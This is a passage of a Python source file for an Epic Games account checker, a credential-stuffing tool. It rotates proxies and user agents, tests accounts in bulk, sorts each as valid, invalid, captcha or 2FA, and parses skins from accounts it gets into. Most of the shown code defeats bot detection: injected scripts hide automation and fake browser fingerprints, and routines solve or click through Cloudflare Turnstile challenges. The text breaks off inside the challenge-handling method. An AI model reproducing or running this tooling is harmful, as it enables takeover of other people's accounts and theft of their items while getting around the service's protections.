"""
Epic Games headless browser-based account checker with enhanced Turnstile solving
Integrates advanced Cloudflare bypass using patchright and camoufox
"""
import asyncio
import random
import time
import aiohttp
from typing import List, Tuple, Dict, Optional, Any
from enum import Enum
from urllib.parse import urlparse
from datetime import datetime

# Import both regular playwright and enhanced browsers
from playwright.async_api import async_playwright as playwright_async, Browser, BrowserContext, Page
try:
    from patchright.async_api import async_playwright as patchright_async
    PATCHRIGHT_AVAILABLE = True
except ImportError:
    PATCHRIGHT_AVAILABLE = False
    print("⚠️ Patchright not available, falling back to regular Playwright")

try:
    from camoufox.async_api import AsyncCamoufox
    CAMOUFOX_AVAILABLE = True
except ImportError:
    CAMOUFOX_AVAILABLE = False
    print("⚠️ Camoufox not available, using Chromium-based browsers only")

from .epic_api_client import EpicAPIClient, EpicWebAPIClient
from .cosmetic_parser import CosmeticParser
from config.settings import (
    LOGIN_URL, 
    HEADLESS, 
    NAVIGATION_TIMEOUT, 
    MAX_CONCURRENT_CHECKS, 
    REQUEST_TIMEOUT,
    BLOCK_RESOURCE_TYPES,
    BROWSER_SLOWMO,
    USE_ENHANCED_BROWSER,
    PREFERRED_BROWSER_TYPE,
    DEBUG_ENHANCED_FEATURES
)

class AccountStatus(Enum):
    VALID = "valid"
    INVALID = "invalid"
    CAPTCHA = "captcha"
    TWO_FA = "2fa"
    ERROR = "error"

class AccountCheckerCF:
    def __init__(self, proxies: List[str] = None):
        self.proxies = proxies or []
        self.playwright = None
        self.browser_pool: Dict[str, Any] = {}
        self.context_pool: Dict[str, List[Any]] = {}  # Pool of reusable contexts
        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
        
        # Initialize cosmetic parser for extracting skins, pickaxes, etc.
        self.cosmetic_parser = CosmeticParser()
        
        # Performance optimization settings from config
        from config.settings import (MAX_CONTEXTS_PER_BROWSER, CONTEXT_REUSE_COUNT, 
                                    CLEANUP_INTERVAL, MIN_DELAY_SINGLE_PROXY, MAX_DELAY_SINGLE_PROXY,
                                    MIN_DELAY_MULTI_PROXY, MAX_DELAY_MULTI_PROXY)
        
        self.max_contexts_per_browser = MAX_CONTEXTS_PER_BROWSER
        self.context_reuse_count = CONTEXT_REUSE_COUNT
        self.context_usage_counter: Dict[str, int] = {}
        self.cleanup_interval = CLEANUP_INTERVAL
        self.checks_performed = 0
        
        # Delay settings for intelligent timing
        self.min_delay_single = MIN_DELAY_SINGLE_PROXY
        self.max_delay_single = MAX_DELAY_SINGLE_PROXY
        self.min_delay_multi = MIN_DELAY_MULTI_PROXY
        self.max_delay_multi = MAX_DELAY_MULTI_PROXY
        
        # Single proxy handling
        self.single_proxy_mode = len(self.proxies) == 1
        self.current_proxy_index = 0
        
        # Enhanced user agents from Turnstile-Solver (more variety for better stealth)
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:129.0) Gecko/20100101 Firefox/129.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"
        ]
        self.user_agent_index = 0
        
        # Turnstile-Solver HTML template for advanced challenge solving
        self.turnstile_html_template = """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Turnstile Solver</title>
            <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async></script>
            <script>
                async function fetchIP() {
                    try {
                        const response = await fetch('https://api64.ipify.org?format=json');
                        const data = await response.json();
                        document.getElementById('ip-display').innerText = `Your IP: ${data.ip}`;
                    } catch (error) {
                        console.error('Error fetching IP:', error);
                        document.getElementById('ip-display').innerText = 'Failed to fetch IP';
                    }
                }
                window.onload = fetchIP;
            </script>
        </head>
        <body>
            <p id="ip-display">Fetching your IP...</p>
            <!-- cf turnstile -->
        </body>
        </html>
        """
    
    async def __aenter__(self):
        """Initialize enhanced browser automation with Turnstile-Solver capabilities"""
        if DEBUG_ENHANCED_FEATURES:
            print("🚀 Initializing enhanced browser automation with Turnstile-Solver")
        
        # Choose browser engine based on availability and settings
        if USE_ENHANCED_BROWSER and PATCHRIGHT_AVAILABLE:
            self.playwright = await patchright_async().start()
            if DEBUG_ENHANCED_FEATURES:
                print("✅ Using Patchright for enhanced stealth")
        else:
            self.playwright = await playwright_async().start()
            if DEBUG_ENHANCED_FEATURES:
                print("✅ Using regular Playwright")
        
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Clean up browsers and Playwright"""
        # Close all browsers in the pool
        for browser in self.browser_pool.values():
            try:
                await browser.close()
            except:
                pass
        
        if self.playwright:
            await self.playwright.stop()
    
    def get_next_user_agent(self) -> str:
        """Get next user agent for rotation"""
        user_agent = self.user_agents[self.user_agent_index]
        self.user_agent_index = (self.user_agent_index + 1) % len(self.user_agents)
        return user_agent
    
    def get_proxy_for_check(self) -> Optional[str]:
        """Get proxy for account check with optimized single proxy handling"""
        if not self.proxies:
            return None
        
        if self.single_proxy_mode:
            # Always use the single proxy
            return self.proxies[0]
        else:
            # Rotate through multiple proxies
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            return proxy
    
    async def cleanup_old_contexts(self, force: bool = False):
        """Clean up old browser contexts to free memory"""
        if not force and self.checks_performed % self.cleanup_interval != 0:
            return
        
        if DEBUG_ENHANCED_FEATURES:
            print(f"🧹 Performing memory cleanup (checks performed: {self.checks_performed})")
        
        contexts_cleaned = 0
        for proxy_key, contexts in list(self.context_pool.items()):
            # Keep only the most recent contexts
            if len(contexts) > self.max_contexts_per_browser:
                old_contexts = contexts[:-self.max_contexts_per_browser]
                self.context_pool[proxy_key] = contexts[-self.max_contexts_per_browser:]
                
                # Close old contexts
                for context in old_contexts:
                    try:
                        await context.close()
                        contexts_cleaned += 1
                    except:
                        pass
        
        # Clean up usage counters for removed contexts
        for key in list(self.context_usage_counter.keys()):
            if key not in [f"{pk}_{i}" for pk in self.context_pool.keys() for i in range(len(self.context_pool[pk]))]:
                del self.context_usage_counter[key]
        
        if DEBUG_ENHANCED_FEATURES and contexts_cleaned > 0:
            print(f"🧹 Cleaned up {contexts_cleaned} old browser contexts")
    
    async def get_optimized_context(self, browser: Any, proxy_key: str) -> Any:
        """Get a completely fresh browser context for maximum isolation"""
        # With CONTEXT_REUSE_COUNT=1, always create fresh contexts for isolation
        if self.context_reuse_count <= 1:
            context = await self.new_context(browser)
            if DEBUG_ENHANCED_FEATURES:
                print(f"🆕 Created fresh isolated context for {proxy_key}")
            return context
        
        # Legacy reuse logic (only if CONTEXT_REUSE_COUNT > 1)
        # Initialize context pool for this proxy if needed
        if proxy_key not in self.context_pool:
            self.context_pool[proxy_key] = []
        
        # Try to reuse an existing context
        contexts = self.context_pool[proxy_key]
        for i, context in enumerate(contexts):
            context_key = f"{proxy_key}_{i}"
            usage_count = self.context_usage_counter.get(context_key, 0)
            
            if usage_count < self.context_reuse_count:
                # Clear session data before reuse to ensure clean state
                await self.clear_context_session(context)
                
                # Reuse this context
                self.context_usage_counter[context_key] = usage_count + 1
                if DEBUG_ENHANCED_FEATURES:
                    print(f"🔄 Reusing context {context_key} (usage: {usage_count + 1}/{self.context_reuse_count}) - Session cleared")
                return context
        
        # Create new context if no reusable ones available
        if len(contexts) < self.max_contexts_per_browser:
            context = await self.new_context(browser)
            contexts.append(context)
            context_key = f"{proxy_key}_{len(contexts) - 1}"
            self.context_usage_counter[context_key] = 1
            
            if DEBUG_ENHANCED_FEATURES:
                print(f"🆕 Created new context {context_key}")
            return context
        
        # Replace oldest context if at max capacity
        old_context = contexts[0]
        try:
            await old_context.close()
        except:
            pass
        
        new_context = await self.new_context(browser)
        contexts[0] = new_context
        context_key = f"{proxy_key}_0"
        self.context_usage_counter[context_key] = 1
        
        if DEBUG_ENHANCED_FEATURES:
            print(f"🔄 Replaced oldest context {context_key}")
        return new_context
    
    async def clear_context_session(self, context: Any):
        """Clear all session data from context to ensure clean state between account checks"""
        try:
            # Clear all cookies
            await context.clear_cookies()
            
            # Clear local storage and session storage for all pages
            for page in context.pages:
                try:
                    # Clear local storage
                    await page.evaluate("() => { localStorage.clear(); }")
                    # Clear session storage
                    await page.evaluate("() => { sessionStorage.clear(); }")
                    # Clear any cached data
                    await page.evaluate("() => { if (window.caches) { caches.keys().then(names => names.forEach(name => caches.delete(name))); } }")
                except:
                    pass
            
            if DEBUG_ENHANCED_FEATURES:
                print("🧹 Context session cleared - cookies, localStorage, sessionStorage")
                
        except Exception as e:
            if DEBUG_ENHANCED_FEATURES:
                print(f"⚠️ Error clearing context session: {e}")
            pass
    
    def parse_proxy_for_playwright(self, proxy_line: str) -> Optional[Dict[str, str]]:
        """Parse proxy string into Playwright proxy format"""
        if not proxy_line:
            return None
        
        try:
            # Handle different proxy formats
            if '://' not in proxy_line:
                # Default to HTTP if no scheme specified
                proxy_line = f"http://{proxy_line}"
            
            parsed = urlparse(proxy_line)
            scheme = parsed.scheme.lower()
            
            # Handle SOCKS5 with authentication issue
            # Chromium doesn't support SOCKS5 proxy authentication, so convert to HTTP
            if scheme == 'socks5' and parsed.username and parsed.password:
                print(f"⚠️ SOCKS5 with auth not supported by Chromium, converting to HTTP")
                scheme = "http"
            elif scheme not in ['http', 'https', 'socks5']:
                print(f"⚠️ Unsupported proxy scheme '{scheme}', defaulting to http")
                scheme = "http"
            
            proxy_dict = {
                "server": f"{scheme}://{parsed.hostname}:{parsed.port}"
            }
            
            # Add authentication if provided and supported
            if parsed.username and parsed.password:
                if scheme in ['http', 'https']:
                    proxy_dict["username"] = parsed.username
                    proxy_dict["password"] = parsed.password
                elif scheme == 'socks5':
                    print(f"⚠️ SOCKS5 authentication not supported, proxy may not work")
            
            print(f"🔧 Parsed proxy: {scheme}://{parsed.hostname}:{parsed.port} (auth: {'yes' if parsed.username and scheme != 'socks5' else 'no'})")
            return proxy_dict
            
        except Exception as e:
            print(f"❌ Error parsing proxy {proxy_line}: {e}")
            return None
    
    async def get_or_launch_browser(self, proxy_line: Optional[str]) -> Any:
        """Get or launch browser with enhanced Turnstile-Solver capabilities"""
        proxy_key = f"{proxy_line or '__noproxy__'}_{PREFERRED_BROWSER_TYPE}"
        
        if proxy_key in self.browser_pool:
            return self.browser_pool[proxy_key]
        
        # Parse proxy (keeping your existing proxy logic)
        proxy_dict = None
        if proxy_line:
            proxy_dict = self.parse_proxy_for_playwright(proxy_line)
        
        # Enhanced browser arguments from Turnstile-Solver
        browser_args = [
            # Core stealth arguments
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-dev-shm-usage",
            "--disable-accelerated-2d-canvas",
            "--no-first-run",
            "--no-zygote",
            "--disable-gpu",
            
            # Hide automation flags (Turnstile-Solver enhanced)
            "--disable-blink-features=AutomationControlled",
            "--disable-automation",
            "--disable-extensions",
            "--disable-plugins",
            "--disable-default-apps",
            "--disable-component-extensions-with-background-pages",
            
            # Performance and stealth (Turnstile-Solver optimized)
            "--disable-background-timer-throttling",
            "--disable-backgrounding-occluded-windows",
            "--disable-renderer-backgrounding",
            "--disable-features=TranslateUI,VizDisplayCompositor",
            "--disable-ipc-flooding-protection",
            "--disable-background-networking",
            "--disable-sync",
            "--metrics-recording-only",
            "--no-report-upload",
            "--disable-web-security",
            
            # Additional Turnstile-Solver stealth features
            "--disable-field-trial-config",
            "--disable-back-forward-cache",
            "--disable-client-side-phishing-detection",
            "--disable-component-update",
            "--no-default-browser-check",
            "--disable-breakpad",
            "--allow-pre-commit-input",
            "--disable-hang-monitor",
            "--disable-popup-blocking",
            "--disable-prompt-on-repost",
            "--force-color-profile=srgb",
            "--password-store=basic",
            "--use-mock-keychain",
            "--no-service-autorun",
            "--export-tagged-pdf",
            "--disable-search-engine-choice-screen",
        ]
        
        # Add user agent to args
        user_agent = self.get_next_user_agent()
        browser_args.append(f"--user-agent={user_agent}")
        
        # Launch browser based on preferred type and availability
        if PREFERRED_BROWSER_TYPE == "camoufox" and CAMOUFOX_AVAILABLE and USE_ENHANCED_BROWSER:
            # Use Camoufox for maximum stealth (Turnstile-Solver's preferred method)
            camoufox = AsyncCamoufox(
                headless=HEADLESS,
                proxy=proxy_dict
            )
            browser = await camoufox.start()
            if DEBUG_ENHANCED_FEATURES:
                print(f"🦊 Launched Camoufox browser with proxy: {proxy_line or 'none'}")
        else:
            # Use Chromium with enhanced stealth (patchright or regular playwright)
            browser = await self.playwright.chromium.launch(
                headless=HEADLESS,
                proxy=proxy_dict,
                args=browser_args,
                slow_mo=BROWSER_SLOWMO
            )
            if DEBUG_ENHANCED_FEATURES:
                print(f"🌐 Launched Chromium browser with proxy: {proxy_line or 'none'}")
        
        self.browser_pool[proxy_key] = browser
        return browser
    
    async def new_context(self, browser: Any) -> Any:
        """Create browser context with enhanced Turnstile-Solver stealth settings"""
        user_agent = self.get_next_user_agent()
        if DEBUG_ENHANCED_FEATURES:
            print(f"🔄 Using User Agent: {user_agent[:50]}...")
        
        context = await browser.new_context(
            user_agent=user_agent,
            viewport={"width": 1920, "height": 1080},
            locale="en-US",
            timezone_id="America/New_York",
            extra_http_headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
                # Enhanced client hints from Turnstile-Solver
                "Sec-Ch-Ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Ch-Ua-Platform-Version": '"15.0.0"'
            }
        )
        
        # Enhanced stealth scripts from Turnstile-Solver
        await context.add_init_script("""
            // Turnstile-Solver enhanced stealth script
            
            // Hide webdriver property completely
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
            });
            
            // Remove automation indicators
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
            delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
            
            // Mock realistic plugins (Turnstile-Solver enhanced)
            Object.defineProperty(navigator, 'plugins', {
                get: () => ({
                    length: 5,
                    0: { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                    1: { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                    2: { name: 'Native Client', filename: 'internal-nacl-plugin' },
                    3: { name: 'WebKit built-in PDF', filename: 'WebKit built-in PDF' },
                    4: { name: 'Microsoft Edge PDF Viewer', filename: 'edge-pdf-viewer' }
                }),
                configurable: true
            });
            
            // Mock languages with more variety
            Object.defineProperty(navigator, 'languages', {
                get: () => ['en-US', 'en', 'es'],
                configurable: true
            });
            
            // Enhanced permissions mock
            const originalQuery = window.navigator.permissions.query;
            window.navigator.permissions.query = (parameters) => {
                const permissions = {
                    'notifications': 'default',
                    'geolocation': 'denied',
                    'camera': 'denied',
                    'microphone': 'denied'
                };
                return Promise.resolve({ 
                    state: permissions[parameters.name] || 'granted' 
                });
            };
            
            // Enhanced chrome object (Turnstile-Solver style)
            window.chrome = {
                runtime: {
                    onConnect: undefined,
                    onMessage: undefined,
                    PlatformOs: {
                        MAC: "mac",
                        WIN: "win",
                        ANDROID: "android",
                        CROS: "cros",
                        LINUX: "linux",
                        OPENBSD: "openbsd"
                    },
                    PlatformArch: {
                        ARM: "arm",
                        X86_32: "x86-32",
                        X86_64: "x86-64"
                    }
                },
                loadTimes: function() {
                    return {
                        commitLoadTime: Date.now() / 1000 - Math.random(),
                        finishDocumentLoadTime: Date.now() / 1000 - Math.random(),
                        finishLoadTime: Date.now() / 1000 - Math.random(),
                        firstPaintAfterLoadTime: 0,
                        firstPaintTime: Date.now() / 1000 - Math.random(),
                        navigationType: 'Other',
                        npnNegotiatedProtocol: 'h2',
                        requestTime: Date.now() / 1000 - Math.random(),
                        startLoadTime: Date.now() / 1000 - Math.random(),
                        wasAlternateProtocolAvailable: false,
                        wasFetchedViaSpdy: true,
                        wasNpnNegotiated: true
                    };
                },
                csi: function() {
                    return {
                        pageT: Date.now(),
                        startE: Date.now(),
                        tran: 15
                    };
                },
                app: {
                    isInstalled: false,
                    InstallState: {
                        DISABLED: "disabled",
                        INSTALLED: "installed",
                        NOT_INSTALLED: "not_installed"
                    },
                    RunningState: {
                        CANNOT_RUN: "cannot_run",
                        READY_TO_RUN: "ready_to_run",
                        RUNNING: "running"
                    }
                }
            };
            
            // Enhanced screen properties
            Object.defineProperty(screen, 'colorDepth', {get: () => 24, configurable: true});
            Object.defineProperty(screen, 'pixelDepth', {get: () => 24, configurable: true});
            Object.defineProperty(screen, 'availWidth', {get: () => 1920, configurable: true});
            Object.defineProperty(screen, 'availHeight', {get: () => 1040, configurable: true});
            
            // Mock hardware concurrency
            Object.defineProperty(navigator, 'hardwareConcurrency', {
                get: () => 8,
                configurable: true
            });
            
            // Mock device memory
            Object.defineProperty(navigator, 'deviceMemory', {
                get: () => 8,
                configurable: true
            });
            
            // Mock battery API
            Object.defineProperty(navigator, 'getBattery', {
                get: () => () => Promise.resolve({
                    charging: true,
                    chargingTime: 0,
                    dischargingTime: Infinity,
                    level: 1
                }),
                configurable: true
            });
            
            // Hide automation in toString
            const originalToString = Function.prototype.toString;
            Function.prototype.toString = function() {
                if (this === navigator.webdriver) {
                    return 'function webdriver() { [native code] }';
                }
                return originalToString.apply(this, arguments);
            };
            
            // Mock connection with realistic values
            Object.defineProperty(navigator, 'connection', {
                get: () => ({
                    effectiveType: '4g',
                    rtt: Math.floor(Math.random() * 50) + 20,
                    downlink: Math.floor(Math.random() * 5) + 5,
                    saveData: false
                }),
                configurable: true
            });
            
            // Override Date to add randomness (Turnstile-Solver technique)
            const originalDate = Date;
            Date = class extends originalDate {
                constructor(...args) {
                    if (args.length === 0) {
                        super(originalDate.now() + Math.floor(Math.random() * 100));
                    } else {
                        super(...args);
                    }
                }
                static now() {
                    return originalDate.now() + Math.floor(Math.random() * 100);
                }
            };
            
            // Mock WebGL for fingerprint resistance
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                if (parameter === 37445) {
                    return 'Intel Inc.';
                }
                if (parameter === 37446) {
                    return 'Intel(R) Iris(TM) Graphics 6100';
                }
                return getParameter.call(this, parameter);
            };
        """)
        
        return context
    
    async def solve_turnstile_challenge(self, page: Any, url: str, sitekey: str) -> Dict[str, Any]:
        """Advanced Turnstile solving using Turnstile-Solver techniques"""
        start_time = time.time()
        
        if DEBUG_ENHANCED_FEATURES:
            print(f"🔧 Starting advanced Turnstile challenge solve for sitekey: {sitekey}")
        
        try:
            # Create Turnstile HTML page using Turnstile-Solver template
            url_with_slash = url + "/" if not url.endswith("/") else url
            turnstile_div = f'<div class="cf-turnstile" style="background: white;" data-sitekey="{sitekey}"></div>'
            page_data = self.turnstile_html_template.replace("<!-- cf turnstile -->", turnstile_div)
            
            # Set up route and navigate
            await page.route(url_with_slash, lambda route: route.fulfill(body=page_data, status=200))
            await page.goto(url_with_slash)
            
            if DEBUG_ENHANCED_FEATURES:
                print("🎯 Setting up Turnstile widget dimensions")
            
            # Set widget dimensions (Turnstile-Solver technique)
            await page.eval_on_selector("//div[@class='cf-turnstile']", "el => el.style.width = '70px'")
            
            if DEBUG_ENHANCED_FEATURES:
                print("🔄 Starting Turnstile response retrieval loop")
            
            # Enhanced solving loop (from Turnstile-Solver)
            for attempt in range(15):  # Increased attempts
                try:
                    turnstile_check = await page.input_value("[name=cf-turnstile-response]", timeout=2000)
                    if turnstile_check == "":
                        if DEBUG_ENHANCED_FEATURES:
                            print(f"🔄 Attempt {attempt + 1} - No Turnstile response yet")
                        
                        # Multiple interaction strategies (Turnstile-Solver approach)
                        strategies = [
                            lambda: page.locator("//div[@class='cf-turnstile']").click(timeout=1000),
                            lambda: page.locator("iframe[src*='challenges.cloudflare.com']").click(timeout=1000),
                            lambda: page.locator("input[type='checkbox']").click(timeout=1000),
                        ]
                        
                        strategy = strategies[attempt % len(strategies)]
                        try:
                            await strategy()
                        except:
                            pass
                        
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                    else:
                        elapsed_time = round(time.time() - start_time, 3)
                        
                        if DEBUG_ENHANCED_FEATURES:
                            print(f"✅ Advanced Turnstile solved: {turnstile_check[:10]}... in {elapsed_time}s")
                        
                        return {
                            'success': True,
                            'token': turnstile_check,
                            'elapsed_time': elapsed_time
                        }
                except Exception as e:
                    if DEBUG_ENHANCED_FEATURES:
                        print(f"⚠️ Attempt {attempt + 1} error: {str(e)}")
                    continue
            
            # Failed to solve
            elapsed_time = round(time.time() - start_time, 3)
            return {
                'success': False,
                'error': 'Max attempts reached',
                'elapsed_time': elapsed_time
            }
            
        except Exception as e:
            elapsed_time = round(time.time() - start_time, 3)
            return {
                'success': False,
                'error': str(e),
                'elapsed_time': elapsed_time
            }
    
    async def handle_cloudflare_challenge(self, page: Any, email: str):
        """Enhanced Cloudflare challenge handling with Turnstile-Solver integration"""
        try:
            if DEBUG_ENHANCED_FEATURES:
                print(f"🛡️ Enhanced Cloudflare challenge handling for {email}")
            
            # First, try to detect sitekey for advanced Turnstile solving
            sitekey = None
            try:
                sitekey_element = await page.query_selector("[data-sitekey]")
                if sitekey_element:
                    sitekey = await sitekey_element.get_attribute("data-sitekey")
                    if sitekey:
                        if DEBUG_ENHANCED_FEATURES:
                            print(f"🔑 Found sitekey: {sitekey}, attempting advanced Turnstile solve")
                        
                        # Use advanced Turnstile solver
                        result = await self.solve_turnstile_challenge(page, page.url, sitekey)
                        if result['success']:
                            print(f"✅ {email} - Advanced Turnstile solved successfully!")
                            return True
                        else:
                            print(f"⚠️ {email} - Advanced Turnstile solve failed: {result.get('error', 'Unknown error')}")
            except Exception as e:
                if DEBUG_ENHANCED_FEATURES:
                    print(f"⚠️ Sitekey detection failed: {e}")
            
            # Fallback to enhanced traditional challenge handling
            print(f"🤖 {email} - Attempting enhanced traditional challenge interaction...")
            
            # Enhanced challenge selectors (from Turnstile-Solver)
            challenge_selectors = [
                # Turnstile checkbox
                "iframe[src*='challenges.cloudflare.com'] >> input[type='checkbox']",
                "iframe[src*='turnstile'] >> input[type='checkbox']",
                "[data-sitekey] iframe >> input[type='checkbox']",
                
                # Turnstile clickable areas
                "iframe[src*='challenges.cloudflare.com']",
                "iframe[src*='turnstile']",
                "[data-sitekey] iframe",
                
                # Direct challenge elements
                ".cf-turnstile",
                ".cf-challenge-container",
                "[data-cf-challenge]",
                
                # Challenge buttons
                "button:has-text('Verify')",
                "button:has-text('I am human')",
                "button:has-text('Continue')",
                "input[type='button'][value*='Verify']",
                
                # Checkbox-style challenges
                "input[type='checkbox'][name*='cf-']",
                "input[type='checkbox'][id*='challenge']",
                
                # Click areas near challenge text
                "text=Verify you are human",
                "text=I'm not a robot",
                "text=Please verify",
            ]
            
            print(f"🤖 {email} - Attempting to interact with Cloudflare challenge...")
            
            # Try each selector type
            for selector in challenge_selectors:
                try:
                    elements = page.locator(selector)
                    count = await elements.count()
                    
                    if count > 0:
                        print(f"🎯 {email} - Found challenge element: {selector}")
                        
                        # Add human-like delay before interaction
                        await asyncio.sleep(random.uniform(1, 3))
                        
                        # Move mouse to element area first
                        try:
                            box = await elements.first.bounding_box()
                            if box:
                                # Move to center of element with slight randomness
                                center_x = box['x'] + box['width'] / 2 + random.randint(-10, 10)
                                center_y = box['y'] + box['height'] / 2 + random.randint(-5, 5)
                                await page.mouse.move(center_x, center_y)
                                await asyncio.sleep(random.uniform(0.5, 1.5))
                        except:
                            # Fallback to random mouse movement
                            await page.mouse.move(
                                random.randint(300, 700), 
                                random.randint(200, 500)
                            )
                            await asyncio.sleep(random.uniform(0.5, 1))
                        
                        # Try different interaction methods
                        interaction_success = False
                        
                        # Method 1: Direct click
                        try:
                            await elements.first.click(timeout=5000)
                            print(f"✅ {email} - Clicked challenge element successfully")
                            interaction_success = True
                        except Exception as click_error:
                            print(f"⚠️ {email} - Direct click failed: {click_error}")
                        
                        # Method 2: Force click if direct click failed
                        if not interaction_success:
                            try:
                                await elements.first.click(force=True, timeout=5000)
                                print(f"✅ {email} - Force clicked challenge element")
                                interaction_success = True
                            except Exception as force_error:
                                print(f"⚠️ {email} - Force click failed: {force_error}")
                        
                        # Method 3: JavaScript click if other methods failed
                        if not interaction_success:
                            try:
                                await elements.first.evaluate("element => element.click()")
                                print(f"✅ {email} - JavaScript clicked challenge element")
                                interaction_success = True
                            except Exception as js_error:
                                print(f"⚠️ {email} - JavaScript click failed: {js_error}")
                        
                        if interaction_success:
                            # Wait for challenge to process
                            print(f"⏳ {email} - Waiting for challenge to process...")
                            await asyncio.sleep(random.uniform(2, 5))
                            
                            # Check if challenge was resolved
                            try:
                                title = await page.title()
                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                    print(f"🎉 {email} - Challenge appears to be resolved!")
                                    return True
                            except:
                                pass
                            
                            # Additional wait for slower challenges
                            await asyncio.sleep(random.uniform(1, 3))
                            return True
                        
                except Exception as selector_error:
                    # Continue to next selector if this one fails
                    continue
            
            # Enhanced iframe-based approach for Turnstile
            print(f"🔍 {email} - Trying enhanced iframe-based challenge interaction...")
            
            # Look for all iframes, including Turnstile-specific ones
            iframe_selectors = [
                "iframe[src*='challenges.cloudflare.com']",
                "iframe[src*='turnstile']",
                "iframe[data-sitekey]",
                "div[data-sitekey] iframe",
                ".cf-turnstile iframe",
                "iframe"  # Fallback to all iframes
            ]
            
            for selector in iframe_selectors:
                try:
                    iframes = page.locator(selector)
                    iframe_count = await iframes.count()
                    
                    if iframe_count > 0:
                        print(f"🎯 {email} - Found {iframe_count} iframe(s) with selector: {selector}")
                        
                        for i in range(iframe_count):
                            try:
                                iframe = iframes.nth(i)
                                
                                # Get iframe source and check if it's Cloudflare related
                                src = await iframe.get_attribute("src") or ""
                                data_sitekey = await iframe.get_attribute("data-sitekey") or ""
                                
                                is_cf_iframe = any(indicator in src.lower() for indicator in ['cloudflare', 'turnstile']) or data_sitekey
                                
                                if is_cf_iframe or selector == "iframe":  # Try all iframes as fallback
                                    print(f"🎯 {email} - Attempting to interact with iframe: {src[:50] if src else 'no src'}...")
                                    
                                    # Method 1: Click on iframe area
                                    try:
                                        box = await iframe.bounding_box()
                                        if box and box['width'] > 0 and box['height'] > 0:
                                            # Calculate click position (slightly offset from center)
                                            click_x = box['x'] + box['width'] * 0.3  # Left side of checkbox area
                                            click_y = box['y'] + box['height'] * 0.5  # Middle height
                                            
                                            print(f"🖱️ {email} - Clicking iframe at ({click_x:.0f}, {click_y:.0f})")
                                            
                                            # Human-like mouse movement
                                            await page.mouse.move(click_x - 50, click_y - 20)
                                            await asyncio.sleep(random.uniform(0.3, 0.7))
                                            await page.mouse.move(click_x, click_y)
                                            await asyncio.sleep(random.uniform(0.2, 0.5))
                                            
                                            # Click
                                            await page.mouse.click(click_x, click_y)
                                            print(f"✅ {email} - Clicked on Cloudflare iframe")
                                            
                                            # Wait for processing
                                            await asyncio.sleep(random.uniform(3, 6))
                                            
                                            # Check if challenge resolved
                                            try:
                                                title = await page.title()
                                                if not any(indicator in title.lower() for indicator in ['just a moment', 'checking', 'challenge']):
                                                    print(f"🎉 {email} - Challenge resolved after iframe click!")
                                                    return True
                                            except:
                                                pass
                                            
                                            return True  # Consider it handled even if we can't verify
                                            
                                    except Exception as iframe_error:
                                        print(f"⚠️ {email} - Iframe click failed: {iframe_error}")
                                        continue
                                    
                                    # Method 2: Try to focus and interact with iframe content
                                    try:
                                        await iframe.focus()
                                        await asyncio.sleep(random.uniform(0.5, 1))
                                        
                                        # Try pressing space or enter
                                        await page.keyboard.press("Space")
                                        await asyncio.sleep(random.uniform(1, 2))
                                        
                                        print(f"✅ {email} - Attempted keyboard interaction with iframe")
                                        return True
                                        
                                    except Exception as keyboard_error:
                                        print(f"⚠️ {email} - Keyboard interaction failed: {keyboard_error}")
                                        continue
                                        
                            except Exception as iframe_iteration_error:
                                print(f"⚠️ {email} - Error processing iframe {i}: {iframe_iteration_error}")
                                continue
                                
                except Exception as selector_error:
                    print(f"⚠️ {email} - Error with selector {selector}: {selector_error}")
                    continue
            
